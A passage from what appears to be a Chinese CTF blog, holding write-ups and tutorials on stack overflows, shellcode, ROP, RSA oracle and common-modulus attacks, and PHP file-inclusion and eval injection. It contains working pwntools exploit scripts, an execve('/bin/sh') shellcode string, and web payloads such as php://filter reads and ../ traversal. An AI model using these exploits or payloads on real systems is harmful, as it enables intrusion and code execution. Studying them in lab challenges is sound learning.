sub, nans = \"\"while(1): if len(ans) == 50: print(ans) break res, n = test(ans) if \"win\" in res: ans += n 通过得到的顺序作为 payload，脚本： 1234567891011121314from pwn import *p = process('./dice_game')# p = remote(\"47.96.239.28\", 9999)p.readuntil(\"name:\")payload = p64(0x1122334455667788) * 8 + p64(0)p.sendline(payload)ans = \"25426251423232651155634433322261116425254446323361\"i = 0while i &lt; 50: p.readuntil(\"nt(1~6): \") n = ans[i] i += 1 p.sendline(n)p.interactive() Xan-stack2感觉这应该算是一道比较好的栈溢出的题。checksec发现 PIE 没开，Canary 和 NX 都开了。 拖进 ida 后 f5： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475int __cdecl main(int argc, const char **argv, const char **envp)&#123; int v3; // eax unsigned int v5; // [esp+18h] [ebp-90h] unsigned int v6; // [esp+1Ch] [ebp-8Ch] int v7; // [esp+20h] [ebp-88h] unsigned int j; // [esp+24h] [ebp-84h] int v9; // [esp+28h] [ebp-80h] unsigned int i; // [esp+2Ch] [ebp-7Ch] unsigned int k; // [esp+30h] [ebp-78h] unsigned int l; // [esp+34h] [ebp-74h] char v13[100]; // [esp+38h] [ebp-70h] unsigned int v14; // [esp+9Ch] [ebp-Ch] v14 = __readgsdword(0x14u); setvbuf(stdin, 0, 2, 0); setvbuf(stdout, 0, 2, 0); v9 = 0; puts(\"***********************************************************\"); puts(\"* An easy calc *\"); puts(\"*Give me your numbers and I will return to you an average *\"); puts(\"*(0 &lt;= x &lt; 256) *\"); puts(\"***********************************************************\"); puts(\"How many numbers you have:\"); __isoc99_scanf(\"%d\", &amp;v5); puts(\"Give me your numbers\"); for ( i = 0; i &lt; v5 &amp;&amp; (signed int)i &lt;= 99; ++i ) &#123; __isoc99_scanf(\"%d\", &amp;v7); v13[i] = v7; &#125; for ( j = v5; ; printf(\"average is %.2lf\\n\", (double)((long double)v9 / (double)j)) ) &#123; while ( 1 ) &#123; while ( 1 ) &#123; while ( 1 ) &#123; puts(\"1. show numbers\\n2. add number\\n3. change number\\n4. get average\\n5. exit\"); __isoc99_scanf(\"%d\", &amp;v6); if ( v6 != 2 ) break; puts(\"Give me your number\"); __isoc99_scanf(\"%d\", &amp;v7); if ( j &lt;= 0x63 ) &#123; v3 = j++; v13[v3] = v7; &#125; &#125; if ( v6 &gt; 2 ) break; if ( v6 != 1 ) return 0; puts(\"id\\t\\tnumber\"); for ( k = 0; k &lt; j; ++k ) printf(\"%d\\t\\t%d\\n\", k, v13[k]); &#125; if ( v6 != 3 ) break; puts(\"which number to change:\"); __isoc99_scanf(\"%d\", &amp;v5); puts(\"new number:\"); __isoc99_scanf(\"%d\", &amp;v7); v13[v5] = v7; &#125; if ( v6 != 4 ) break; v9 = 0; for ( l = 0; l &lt; j; ++l ) v9 += v13[l]; &#125; return 0;&#125; 还能看到有一个hackhere函数，直接调用了system(&quot;/bin/bash&quot;)。 12345puts(\"which number to change:\");__isoc99_scanf(\"%d\", &amp;v5);puts(\"new number:\");__isoc99_scanf(\"%d\", &amp;v7);v13[v5] = v7; // index out of bound \b 这里发现 v5 和 v7 没有做任何检查，能达到任意地址写。 所以这题的思路就是将main函数 return 地址覆盖为hackhere的地址。 基本就是 ret 到 hackhere 然后直接就成功了： 12345678910111213141516171819202122232425#!/usr/bin/env pythonfrom pwn import *import ctypesp = process('./stack2')context.log_level = 'debug'def change(index, content): p.sendlineafter('5. exit\\n', '3') p.sendlineafter('which number to change:\\n', str(index)) p.sendlineafter('new number:\\n', str(content))p.sendlineafter('How many numbers you have:\\n', '1')p.sendlineafter('Give me your numbers\\n', '1')hack_addr = 0x0804859boffset = 132# gdb.attach(p, 'b *0x0804859b')for i in range(4): byte = (hack_addr &gt;&gt; (i * 8)) &amp; 0xff byte = str(ctypes.c_int8(byte)) start = byte.find('(') + 1 end = byte.find(')') byte = int(byte[start:end]) change(offset + i, byte)p.sendlineafter('5. exit\\n', '5')p.interactive() 但发现远程没有 bash，所以想到直接用字符串中的 sh，即system(&amp;&quot;/bin/bash&quot;[7])，只需要找到字符串在栈上的位置： 12345678910111213141516171819202122232425262728293031323334353637#!/usr/bin/env pythonfrom pwn import *import ctypesp = process('./stack2')context.log_level = 'debug'def change(index, content): p.sendlineafter('5. exit\\n', '3') p.sendlineafter('which number to change:\\n', str(index)) p.sendlineafter('new number:\\n', str(content))p.sendlineafter('How many numbers you have:\\n', '1')p.sendlineafter('Give me your numbers\\n', '1')hack_addr = 0x0804859bsys_addr = 0x08048450offset = 132# gdb.attach(p, 'b *0x0804859b')# overflow retfor i in range(4): byte = (sys_addr &gt;&gt; (i * 8)) &amp; 0xff byte = str(ctypes.c_int8(byte)) start = byte.find('(') + 1 end = byte.find(')') byte = int(byte[start:end]) change(offset + i, byte)str_addr = 0x08048987offset2 = offset + 8# point to string 'sh'for i in range(4): byte = (str_addr &gt;&gt; (i * 8)) &amp; 0xff byte = str(ctypes.c_int8(byte)) start = byte.find('(') + 1 end = byte.find(')') byte = int(byte[start:end]) change(offset2 + i, byte)p.sendlineafter('5. exit\\n', '5')p.interactive() CryptobabyRSA题目信息如下： 12345e = 0x10001n = 0x0b765daa79117afe1a77da7ff8122872bbcbddb322bb078fe0786dc40c9033fadd639adc48c3f2627fb7cb59bb0658707fe516967464439bdec2d6479fa3745f57c0a5ca255812f0884978b2a8aaeb750e0228cbe28a1e5a63bf0309b32a577eecea66f7610a9a4e720649129e9dc2115db9d4f34dc17f8b0806213c035e22f2c5054ae584b440def00afbccd458d020cae5fd1138be6507bc0b1a10da7e75def484c5fc1fcb13d11be691670cf38b487de9c4bde6c2c689be5adab08b486599b619a0790c0b2d70c9c461346966bcbae53c5007d0146fc520fa6e3106fbfc89905220778870a7119831c17f98628563ca020652d18d72203529a784ca73716dbc = 0x4f377296a19b3a25078d614e1c92ff632d3e3ded772c4445b75e468a9405de05d15c77532964120ae11f8655b68a630607df0568a7439bc694486ae50b5c0c8507e5eecdea4654eeff3e75fb8396e505a36b0af40bd5011990663a7655b91c9e6ed2d770525e4698dec9455db17db38fa4b99b53438b9e09000187949327980ca903d0eef114afc42b771657ea5458a4cb399212e943d139b7ceb6d5721f546b75cd53d65e025f4df7eb8637152ecbb6725962c7f66b714556d754f41555c691a34a798515f1e2a69c129047cb29a9eef466c206a7f4dbc2cea1a46a39ad3349a7db56c1c997dc181b1afcb76fa1bbbf118a4ab5c515e274ab2250dba1872be0 最低有效位攻击了解一下。 对密文乘2^e(mod n)操作，再解密的时候，如果为偶数，说明明文在(0, n/2)之间，否则在(n/2, n)之间。这样，只需要 log2n 次就可以知道明文： 12345678910111213141516171819202122232425262728293031323334#!/usr/bin/env pythonfrom pwn import *e = 0x10001n = 0x0b765daa79117afe1a77da7ff8122872bbcbddb322bb078fe0786dc40c9033fadd639adc48c3f2627fb7cb59bb0658707fe516967464439bdec2d6479fa3745f57c0a5ca255812f0884978b2a8aaeb750e0228cbe28a1e5a63bf0309b32a577eecea66f7610a9a4e720649129e9dc2115db9d4f34dc17f8b0806213c035e22f2c5054ae584b440def00afbccd458d020cae5fd1138be6507bc0b1a10da7e75def484c5fc1fcb13d11be691670cf38b487de9c4bde6c2c689be5adab08b486599b619a0790c0b2d70c9c461346966bcbae53c5007d0146fc520fa6e3106fbfc89905220778870a7119831c17f98628563ca020652d18d72203529a784ca73716dbc = 0x4f377296a19b3a25078d614e1c92ff632d3e3ded772c4445b75e468a9405de05d15c77532964120ae11f8655b68a630607df0568a7439bc694486ae50b5c0c8507e5eecdea4654eeff3e75fb8396e505a36b0af40bd5011990663a7655b91c9e6ed2d770525e4698dec9455db17db38fa4b99b53438b9e09000187949327980ca903d0eef114afc42b771657ea5458a4cb399212e943d139b7ceb6d5721f546b75cd53d65e025f4df7eb8637152ecbb6725962c7f66b714556d754f41555c691a34a798515f1e2a69c129047cb29a9eef466c206a7f4dbc2cea1a46a39ad3349a7db56c1c997dc181b1afcb76fa1bbbf118a4ab5c515e274ab2250dba1872be0upper = nlower = 0k = 1while True: r = remote('111.198.29.45', 33136) r.recvuntil('now\\n') pat = (pow(pow(2, k, n), e, n) * c) % n new_c = hex(pat)[2:].strip('L') r.sendline(new_c) data = r.recvline()[:-1] r.close() gap = upper - lower if data == 'even': info('Round &#123;&#125;: even'.format(str(k))) upper = (upper + lower) / 2 if data == 'odd': info('Round &#123;&#125;: odd'.format(str(k))) lower = (upper + lower) / 2 if data == 'error': break if gap &lt; 2: break info(gap) k += 1flag = '&#123;:x&#125;'.format(upper).decode('hex')[:-1] + '&#125;'print 'flag:', flag Xman-RSA拿到四个文件后，其中有一个很像 python 的脚本，通过对关键字等的判断，自己写脚本还原： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546l1 = &#123; 'a': 'd', 'b': 'm', 'd': 'e', 'e': 'n', 'f': 'w', 'g': 'f', 'h': 'o', 'i': 'x', 'j': 'g', 'k': 'p', 'l': 'y', 'm': 'h', 'p': 'i', 'q': 'r', 'r': 'a', 't': 's', 'u': 'b', 'v': 'k', 'w': 't', 'x': 'c', 'y': 'l', 'z': 'u'&#125;f = open('encryption.encrypted', 'r')ans = f.read()# print ansres = \"\"for ch in ans: flag = 0 for key, value in l1.items(): if ch == key: res += value flag = 1 break else: continue if flag == 1: continue else: res += chprint resraw_input()f = open('1.py', 'wb')f.write(res)f.close() 还原出原来的加密脚本： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667from gmpy2 import is_primefrom os import urandomimport base64def bytes_to_num(b): return int(b.encode('hex'), 16)def num_to_bytes(n): b = hex(n)[2:-1] b = '0' + b if len(b)%2 == 1 else b return b.decode('hex')def get_a_prime(l): random_seed = urandom(l) num = bytes_to_num(random_seed) while True: if is_prime(num): break num+=1 return numdef encrypt(s, e, n): p = bytes_to_num(s) p = pow(p, e, n) return num_to_bytes(p).encode('hex')def separate(n): p = n % 4 t = (p*p) % 4 return t == 1f = open('flag.txt', 'r')flag = f.read()msg1 = \"\"msg2 = \"\"for i in range(len(flag)): if separate(i): # 奇数 msg2 += flag[i] else: # 偶数 msg1 += flag[i]p1 = get_a_prime(128)p2 = get_a_prime(128)p3 = get_a_prime(128)n1 = p1*p2n2 = p1*p3e = 0x1001c1 = encrypt(msg1, e, n1)c2 = encrypt(msg2, e, n2)print(c1)print(c2)e1 = 0x1001e2 = 0x101p4 = get_a_prime(128)p5 = get_a_prime(128)n3 = p4*p5c1 = num_to_bytes(pow(n1, e1, n3)).encode('hex')c2 = num_to_bytes(pow(n1, e2, n3)).encode('hex')print(c1)print(c2)print(base64.b64encode(num_to_bytes(n2)))print(base64.b64encode(num_to_bytes(n3))) 代码看完后，思路是先用共模攻击解出n1，之后利用公约数得到p1、p2、p3，再求出d1、d2，最后解出msg1、msg2。给出的文件中，ciphertext为第二次输出的c1和c2，，n1.encrypted为第二次输出的c1和c2，n2&amp;n3即最后输出的被加密后的n2和n3。解密脚本如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859#!/usr/bin/env pythonimport base64import gmpy2f = open('n2&amp;n3', 'rb')n2 = f.readline()n3 = f.readline()f.close()n2 = base64.b64decode(n2).encode('hex')n3 = base64.b64decode(n3).encode('hex')n2 = int(n2, 16)n3 = int(n3, 16)# print 'n2:', n2# print 'n3:', n3# first step: solve n1e1 = 0x1001e2 = 0x101f = open('n1.encrypted', 'rb')n1_c1 = f.readline()n1_c2 = f.readline()f.close()n1_c1 = int(n1_c1, 16)n1_c2 = int(n1_c2, 16)# print 'n1_c1:', n1_c1# print 'n1_c2:', n1_c2gcd, s, t = gmpy2.gcdext(e1, e2)if s &lt; 0: s = abs(s) n1_c1 = gmpy2.invert(n1_c1, n3)if t &lt; 0: t = abs(t) n1_c2 = gmpy2.invert(n1_c2, n3)n1 = gmpy2.powmod(n1_c1, s, n3) * gmpy2.powmod(n1_c2, t, n3) % n3print 'n1:', n1# second step: solve flagf = open('ciphertext', 'rb')c1 = f.readline()c2 = f.readline()f.close()c1 = int(c1, 16)c2 = int(c2, 16)print 'c1:', c1print 'c2:', c2e = 0x1001p1 = gmpy2.gcd(n1, n2)p2 = n1 / p1p3 = n2 / p1d1 = gmpy2.invert(e, (p1 - 1) * (p2 - 1))d2 = gmpy2.invert(e, (p1 - 1) * (p3 - 1))m1 = pow(c1, d1, n1)m2 = pow(c2, d2, n2)msg1 = hex(m1)[2:].decode('hex')msg2 = hex(m2)[2:].decode('hex')flag = ''for i in range(len(msg1 + msg2)): if i % 2 == 0: flag += msg1[i / 2] else: flag += msg2[i / 2]print 'flag:', flag 参考网站https://ihomura.cn/2018/07/15/WriteUp-QCTF-Xman-babymips/https://www.xctf.org.cn/library/details/8723e039db0164e2f7345a12d2edd2a5e800adf7/https://ihomura.cn/2018/07/15/WriteUp-QCTF-Xman-stack2/https://www.xmsec.cc/stackoverflow-ropbasic/https://blog.csdn.net/xuchen16/article/details/81080580https://blog.csdn.net/xuchen16/article/details/81064079http://www.freebuf.com/column/177864.htmlhttps://introspelliam.github.io/2018/03/27/crypto/RSA-Least-Significant-Bit-Oracle-Attack/http://www.cnblogs.com/semishigure/p/9318258.htmlhttps://blog.csdn.net/qq_33438733/article/details/81137057","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"qianfei11.coding.me/tags/ctf/"},{"name":"wp","slug":"wp","permalink":"qianfei11.coding.me/tags/wp/"}]},{"title":"PWN入门（三）","slug":"PWN入门（三）","date":"2018-07-11T00:50:39.000Z","updated":"2019-08-26T05:53:15.310Z","comments":true,"path":"2018/07/11/PWN入门（三）/","link":"","permalink":"qianfei11.coding.me/2018/07/11/PWN入门（三）/","excerpt":"Shellcode’s Magic&amp;Basic ROP.","text":"Shellcode’s Magic&amp;Basic ROP. shellcode 是一段用于利用软件漏洞而执行的代码，以其经常让攻击者获得 shell 而得名。shellcode 常常使用机器语言编写。 系统调用（int 0x80） NAME EAX EBX ECX EDX sys_exit 1 int 0 0 sys_read 3 unsigned int char * size_t sys_write 4 unsigned int const_char * size_t sys_open 5 const char * int int sys_execve 11 struct pt_regs 0 0 PS：最常用的为 11 号调用。也就是execve(&quot;/bin/sh&quot;,0,0)。 编写 ShellCode自己编写 shellcode 的优点是灵活、可以随机应变。 坏字符Shellcode 中存在 0x00 字节在进行利用的时候会被截断。Shellcode 如果存储在堆或是栈的内存中，这样在 shellcode 执行时就不能出现 0x00 这样的阶段字符。 \\x00在执行MOV EAX,5时，相当于MOV EAX,0x00000005，即会产生0x00，可以使用MOV AL,5来绕过 \\x0A绕过可以通过!@#$%。 EBX 中的参数（/bin/sh）一般做法是压入栈后取 ESP： 123PUSH 0x68732F2FPUSH 0x6E69622FMOV EBX,ESP 前两段十六进制转换成 ascii 码是：hs//nib/，取 ESP 的值到 EBX 中后，EBX 的值即为：字符串/bin//sh的首地址。 PS：在多级目录下，多个斜杠是对路径没有影响的。 nasm 反汇编工具下载Netwide Assembler 是一款基于英特尔 x86 架构的汇编与反汇编工具。它可以用来编写 16 位、32 位（IA-32）和 64 位（x86-64）的程序。 NASM 被认为是 Linux 平台上最受欢迎的汇编工具之一。 sudo apt-get install nasm报错记录一下无法下载时的解决方法。 使用ps -A | grep apt命令来找出所有apt进程。 使用sudo kill -9 {进程编号}来逐个杀死进程。 结束所有进程后即可下载。 完整编写过程写入文件shellcode.asm： 1234567891011Section .text global _start_start: xor ecx,ecx mul ecx push ecx push 0x68732f2f push 0x6e69622f mov ebx,esp mov al,0xb int 0x80 PS：关于这两条指令：XOR ECX,ECX =&gt; MUL ECX，经过测试，会先将 ECX 中的值置零，然后 EAX、EDX 中的值也都会变为零。 执行命令：nasm -f elf shellcode.asm -o shellcode.o后，使用objdump命令对shellcode.o进行反汇编：objdump -d shellcode.o。 将十六进制部分记录下来，就构成了一条 shellcode：\\x31\\xc9\\xf7\\xe1\\x51\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xb0\\x0b\\xcd\\x80。 ROP面向返回编程（Return-Oriented Programming）是计算机安全漏洞利用技术，该技术允许攻击者在安全防御的情况下执行代码，如不可执行的内存和代码签名。攻击者控制堆栈调用以劫持程序控制流并执行针对性的机器语言指令序列（称为 Gadgets）。每一段 gadget 通常结束于 return 指令，并位于共享库代码中的子程序。系列调用这些代码，攻击者可以在拥有更简单攻击防范的程序内执行任意操作。 相关保护机制NX 即 No-eXecute（不可执行）的意思，NX（类似于 windows 下的 DEP）的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入 shellcode 时，程序会尝试在数据页面上执行指令，此时 CPU 就会抛出异常，而不是去执行恶意指令。 PS： No eXecute（NX） =&gt; linux Data Execution Prevention（DEP） =&gt; windows 也就是说：“可执行不可写，可写不可执行。” ASLRAddress Space Layout Randomization（地址空间布局随机化），该技术在 2005 年的 kernel2.6.12 中被引入到 Linux 系统，它将进程的某些内存空间地址进行随机化来增大入侵者预测目的地址的难度，从而降低进程被成功入侵的风险。当前 Linux、Windows 等主流操作系统都已经采用该项技术。 分级： 0：没有随机化。即关闭 ASLR。 1：保留的随机化。共享库、栈、mmap()以及 VDSO 将被随机化。 2：完全的随机化。在 1 的基础上，通过brk()分配的内存空间也将被随机化。 PS： ASLR 并不负责 BSS 段、代码段（文本段）和数据段（DATA 段）的随机化。 堆栈空间被完全随机化。 7-11源码： 123456789101112131415161718#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;void A()&#123; setvbuf(stdout, 0, _IONBF, 0); srand(time(0) ^ getpid()); char buf[100]; gets(buf); int magic = rand(); if (atoi(buf) == magic) &#123; puts(\"Okay...\"); system(\"sh\"); &#125;&#125;int main()&#123; A();&#125; 这道题和之前的一题很类似，但是将 buf 和 magic 两个变量的位置进行了调换，所以无法通过直接覆盖 magic 的值来 getshell。（当然还有一种方法时直接获得system(&quot;sh&quot;);的地址来 getshell） 简单难度此时 ASLR 是关闭的。 基本的想法是先填入 shellcode，然后通过 ret 的偏移量来跳转到 shellcode 的首地址，执行execve(&quot;/bin/sh&quot;,0,0)来 getshell。 shellcode 在之前已经写好了，偏移量也可以通过之前缓冲区溢出的方法来得到。 最后应该如何获得 shellcode 的首地址？可以通过如下 payload 来获取。 12345678910# test.pyfrom pwn import *p = process('./7-11')raw_input() # 相当于设下断点shellcode=p32(0xdeadbeef)+\"\\x31\\xc9\\xf7\\xe1\\x51\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xb0\\x0b\\xcd\\x80\"addr=p32(0x12345678)offset=116payload=shellcode+(offset-len(shellcode))*'A'+addrp.sendline(payload)p.interactive() 这里在 shellcode 前加上“0xdeadbeef”，是为了之后在调试时更方便地找到首地址。raw_input()要求输入值，可以使程序在运行时终止，相当于一个断点。 运行 test.py，会得到该程序的 PID，用 gdb 的 attach 命令执行它。 在运行程序处随便输入值，然后在 gdb 中用 finish 命令使程序执行到gets()函数结束，再用 searchmem 命令查找“0xdeadbeef”的地址，即得到 shellcode 的首地址。 最后的 exp 如下： 12345678910# 7-11.pyfrom pwn import *p = process('./7-11')shellcode=\"\\x31\\xc9\\xf7\\xe1\\x51\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xb0\\x0b\\xcd\\x80\"addr=p32(0xffffcfa8)offset=116# payload=shellcode+(offset-len(shellcode))*'A'+addrpayload=shellcode.ljust(offset,'A')+addrp.sendline(payload)p.interactive() 中等难度通过命令sudo sh -c &quot;echo 2 &gt; /proc/sys/kernel/randomize_va_space&quot;，打开 ASLR。 通过之前的了解，当 ASLR 开启时，堆栈的地址是随机的，而 BSS 的地址是不变的，那么通过 BSS 段可以做一些文章。 PS：BSS（Block Started by Symbol）通常是指用来存放程序中未初始化的全局变量和静态变量的一块内存区域。其特点是可读写，且在程序执行之前会自动清 0。 总体的思路是利用 BSS 段地址不变的特性，构造 payload：payload=offset*&#39;A&#39;+p32(gets_addr)+p32(bss+0x100)+p32(bss+0x100)（因为 BSS 段开头部分可能存储一些重要数据，故增加 0x100 来避免影响程序）。第一个 BSS 首地址表示gets()的返回地址，第二个 BSS 首地址表示gets()的参数。 那么通过 payload 可知，程序执行时会重新返回到gets()函数处，调用函数时，相当于先Push retaddr再Jump，即第一个 BSS 首地址为函数返回地址，再输入 shellcode 作为函数参数，即第二个 BSS 首地址。 使用 gdb 对程序调试，用 vmmap 命令查看 bss 段： 记录下 bss 段地址。通过objdump -d查看gets()函数地址： 两个地址都搞定后，那么就可以写出 exp 了： 12345678910111213from pwn import *# p = remote('10.21.13.88',1025)p = process('./7-11')shellcode=\"\\x31\\xc9\\xf7\\xe1\\x51\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xb0\\x0b\\xcd\\x80\"offset=116bss=0x0804a000gets_addr=0x08048400payload=offset*'A'+p32(gets_addr)+p32(bss+0x100)+p32(bss+0x100)p.sendline(payload)# gdb.attach(p,'''# ''') //在运行脚本时可以直接打开gdb进行调试p.sendline(shellcode)p.interactive() pwnable.tw-startchecksec 一下，发现保护都没开： 123456[*] &apos;/home/assassinq/Desktop/start&apos; Arch: i386-32-little RELRO: No RELRO Stack: No canary found NX: NX disabled PIE: No PIE (0x8048000) 反编译出来只有_start和_exit，应该是个汇编程序。可以通过系统调用判断出调用的函数： 12345678910111213141516171819202122232425262728293031323334./start: file format elf32-i386Disassembly of section .text:08048060 &lt;_start&gt;: 8048060: 54 push esp 8048061: 68 9d 80 04 08 push 0x804809d 8048066: 31 c0 xor eax,eax 8048068: 31 db xor ebx,ebx 804806a: 31 c9 xor ecx,ecx 804806c: 31 d2 xor edx,edx 804806e: 68 43 54 46 3a push 0x3a465443 8048073: 68 74 68 65 20 push 0x20656874 8048078: 68 61 72 74 20 push 0x20747261 804807d: 68 73 20 73 74 push 0x74732073 8048082: 68 4c 65 74 27 push 0x2774654c 8048087: 89 e1 mov ecx,esp 8048089: b2 14 mov dl,0x14 804808b: b3 01 mov bl,0x1 804808d: b0 04 mov al,0x4 ; sys_write 804808f: cd 80 int 0x80 8048091: 31 db xor ebx,ebx 8048093: b2 3c mov dl,0x3c 8048095: b0 03 mov al,0x3 ; sys_read 8048097: cd 80 int 0x80 8048099: 83 c4 14 add esp,0x14 804809c: c3 ret0804809d &lt;_exit&gt;: 804809d: 5c pop esp 804809e: 31 c0 xor eax,eax 80480a0: 40 inc eax 80480a1: cd 80 int 0x80 具体寄存器的值与系统调用的关系： 寄存器 作用 eax 中断类型号 ebx STDIN/STDOUT ecx 字符串地址 edx 字符串长度 因为栈是可执行的并且开启了 ASLR。我们的想法就是通过泄漏栈地址，然后填入 shellcode，跳转过去 getshell。 exp 如下： 123456789101112131415161718#!/usr/bin/env pythonfrom pwn import *local = 1if local: p = process('./start')else: p = remote('139.162.123.119', 10000)write = 0x8048087# gdb.attach(p)offset = 20payload = 'A' * offset + p32(write)p.sendafter('CTF:', payload)stack = u32(p.recv(4)) + 0x10print 'stack:', hex(stack)sh = open('sh.bin').read()payload = 'A' * 20 + p32(stack + 4) + shp.send(payload)p.interactive() 参考网站https://linux.cn/article-8040-1.htmlhttp://bestwing.me/2017/03/19/stack-overflow-two-ROP/https://introspelliam.github.io/2017/09/30/linux%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%B8%B8%E7%94%A8%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/https://blog.csdn.net/white_eyes/article/details/7169199https://b3t4m3ee.github.io/2018/07/10/Shellcode-s-Magic/https://blog.csdn.net/Plus_RE/article/details/79199772http://showlinkroom.me/2017/01/22/pwnable-tw/","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"qianfei11.coding.me/tags/ctf/"},{"name":"pwn","slug":"pwn","permalink":"qianfei11.coding.me/tags/pwn/"}]},{"title":"WEB入门（五）","slug":"WEB入门（五）","date":"2018-07-10T09:10:35.000Z","updated":"2019-08-26T05:48:16.106Z","comments":true,"path":"2018/07/10/WEB入门（五）/","link":"","permalink":"qianfei11.coding.me/2018/07/10/WEB入门（五）/","excerpt":"PHP 伪协议和文件包含。","text":"PHP 伪协议和文件包含。 PHP 伪协议不是指网络上的TCP/IP 协议，而是操作系统提供支持的一种协议，类似标准协议 HTTP、FTP。自定义协议叫做伪协议。 伪协议格式：zzz://xxxxxx。 PHP 伪协议总和 形式 作用 file:// 访问本地文件系统 http:// 访问 HTTP(s) 网址 ftp:// 访问 FTP(s) URLs php:// 访问各个输入/输出（I/Ostreams） zlib:// 压缩流 data:// 数据（RFC 2397） glob:// 查找匹配的文件路径模式 phar:// PHP 归档 ssh2:// Secure Shell 2 rar:// RAR ogg:// 音频流 expect:// 处理交互式的流 配置 allow_url_fopen：能否远程文件包含 allow_url_include：能否使用伪协议 PHP 伪协议应用php://filter形式：?file=php://filter/convert.base64-encode/resource=xxx.php php://filter是一种元封装器，设计用于“数据流打开”时的“筛选过滤”应用，对本地磁盘文件进行读写。简单来讲就是可以在执行代码前将代码换个方式读取出来，只是读取，不需要开启allow_url_include。 应用点击跳转页面后，通过伪协议读取源码： 源码解密后得到 flag： 变量覆盖漏洞（extract()）int extract(array &amp;$var_array, int $extract_type = EXTR_OVERWRITE, string $prefix = null) extract()函数从数组中将变量导入到当前的符号表。该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。 第二个参数type用于指定当某个变量已经存在，而数组中又有同名元素时，extract()函数如何对待这样的冲突。该函数返回成功导入到符号表中的变量数目。 extract(array,extract_rules,prefix) extract_rules 的默认值为 EXTR_OVERWRITE，表示如果有冲突，则覆盖已有的变量。 应用（lianxi-input1）源码： 123456789101112&lt;?php$flag='xxxxx';extract($_GET);if(isset($shiyan)&#123; $content=trim($flag); if($shiyan==$content) echo'flag&#123;......&#125;'; else echo'Oh.no';&#125;?&gt; 通过extract()变量覆盖，构造 payload?shiyan=1&amp;flag=1得到 flag。 file_get_contents()file_get_contents()函数把整个文件读入一个字符串中。 应用（lianxi-data）源码： 12345678&lt;?php$user=$_GET['user'];#echo $user;if(isset($user)&amp;&amp;(file_get_contents($user,'r')==='the user is admin')) echo \"flag&#123;xxxxxxxxxxxxx&#125;\";else echo \"you are not admin ! \";?&gt; 分别通过 GET 和 POST 两种方式获得 flag： 应用四先根据提示查看 php.ini 配置情况 发现可以通过伪协议来执行代码，先获得根路径： 再通过scandir()函数来扫根路径就能找到 flag 路径，直接访问就得到 flag。 eval()闭合漏洞eval()函数可以执行函数内部字符串所构成的指令。通过闭合前后的括号可以达到执行其他命令的效果。 应用（lianxi-excute）源码： 123456 &lt;?php include \"flag.php\"; $a = @$_REQUEST['hello']; eval( \"var_dump($a);\"); show_source(__FILE__);?&gt; 构造 payload：);print_r(file(&quot;./flag.php&quot;) 即eval(&quot;var_dump();print_r(file(&quot;./flag.php&quot;));&quot;); 应用六源码： 12345678 &lt;?php show_source(__FILE__); if(isset($_REQUEST['path']))&#123; include($_REQUEST['path']); &#125;else&#123; include('phpinfo.php'); &#125;?&gt; 先通过伪协议扫描当前目录：&lt;?php print_r(scandir(&quot;.&quot;)); ?&gt; 直接访问 flag.php 得到 flag。 phar://phar://是数据流包装器，自 PHP5.3.0 起开始有效，也是 php 的一个函数，功能是解压还原。 应用在 php 文件中写入&lt;?php phpinfo(); ?&gt;，将文件压缩后修改后缀名为jpg。 上传文件后构造 payload：http://127.0.0.1/lianxi/phar1/include.php?file=phar://upload/11.jpg/11。 PHP 文件包含漏洞在通过函数包含文件时，由于没有对包含的文件名进行有效的过滤处理，被攻击者利用从而导致了包含了Web 根目录以外的文件进来，就会导致文件信息的的泄漏甚至注入了恶意代码 分类 远程文件包含（RFI）：?file=http://file/text.txt 本地文件包含（LFI）：?file=../text.txt PHP 文件包含的几个函数 include()：只有代码执行到该函数时才会包含文件进来，发生错误时只给出一个警告并继续向下执行。 include_once()：和include()功能相同，区别在于当重复调用同一文件时，程序至调用一次。 require()：只要程序执行就包含文件进来，发生错误时会输出错误结果并终止运行。 require_once()：和require()功能相同，区别在于当重复调用同一文件时，程序只调用一次。 %00截断（在 PHP5.3.4 之前有效）在$_GET[&quot;filename&quot;]中常见 形式：filename=test.php%00.txt 主要利用：上传时路径必须为 上传路径必须为 txt、png 等结尾时 文件下载时，绕过白名单检查 文件包含时，截断后面限制（主要是文件包含时） PS：PHP 配置中magic_quotes_gpc=Off，即没有对数据进行转义解析。 从根目录搜寻/../../../../../../www/dvwa/php.ini 前面必须加/，表示从根目录开始。 双写重构造str_replace(array(&quot;../&quot;,&quot;..\\&quot;),&quot;&quot;,$file); payload：?page=/..././..././www/dvwa/php.ini file 包含file://协议（本地包含文件）：将绝对路径下的文件包含进来。 漏洞利用： 上传一个内容为php的文件 利用file协议取包含上传文件（需要知道上传文件的绝对路径） 实现任意命令执行 PHP 相关函数整理 函数 功能 extract() 从数组中将变量导入到当前的符号表。该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。 isset() 检测变量是否设置，并且不是 NULL。 trim() 移除字符串两侧的空白字符或其他预定义字符。 file_get_contents() 用于将文件的内容读入到一个字符串中的首选方法。如果操作系统支持，还会使用内存映射技术来增强性能。 print_r() 显示关于一个变量的易于理解的信息。如果给出的是 string、integer 或 float，将打印变量值本身。如果给出的是 array，将会按照一定格式显示键和元素。object 与数组类似。 scandir() 返回指定目录中的文件和目录的数组。 phpinfo() 输出 PHP 当前状态的大量信息，包含了 PHP 编译选项、启用的扩展、PHP 版本、服务器信息和环境变量（如果编译为一个模块的话）、PHP 环境变量、操作系统版本信息、path 变量、配置选项的本地值和主值、HTTP 头和 PHP 